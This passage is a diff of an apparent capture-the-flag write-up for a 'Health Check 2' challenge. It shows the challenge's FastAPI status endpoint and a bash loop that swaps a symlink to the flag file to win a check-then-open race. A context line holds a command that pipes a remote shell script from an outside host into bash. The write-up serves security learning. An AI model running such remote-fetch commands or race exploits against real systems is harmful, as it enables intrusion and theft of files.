@@ -73,3 +73,38 @@ curl http://server-to-shell.com/shell.sh|bash
 
 
 ## Health Check 2
+
+![examine](https://user-images.githubusercontent.com/45040001/188760193-9a4b878f-9659-4dd7-864d-e0646ab7f53a.png)
+
+
+```python
+@app.get('/{dir_name}')
+async def get_status(dir_name: str):
+    file = data_path / dir_name / 'status.json'
+    if not file.resolve().is_relative_to((data_path / dir_name).resolve()):
+        return HTTPException(404, detail='no status')
+    try:
+        with open(file, 'r') as fp:
+            return fp.read()
+    except:
+        return HTTPException(404, detail='no status')
+```
+
+![upload zip_for flag](https://user-images.githubusercontent.com/45040001/188760009-9ed5c627-b8f2-4105-b548-11f59ae5bd6a.png)
+
+```bash
+# run executable into flag.zip
+while :; do ln -s /home/healthcheck/app/flag2 status.json; rm status.json; echo 'lalal' > status.json; rm status.json; done
+```
+
+
+![run_my_script](https://user-images.githubusercontent.com/45040001/188760071-b6c4a1d1-212c-44d4-ab9a-9a9399777a51.png)
+
+![404](https://user-images.githubusercontent.com/45040001/188760084-ea4bb487-ce74-4944-b0ad-b29b171f238c.png)
+
+![lalala](https://user-images.githubusercontent.com/45040001/188760090-36c82282-f3d3-4ede-9edc-6e5ff54fdc61.png)
+
+![flag](https://user-images.githubusercontent.com/45040001/188760093-e824b6d0-d869-4148-8db6-b443521888da.png)
+
+
+
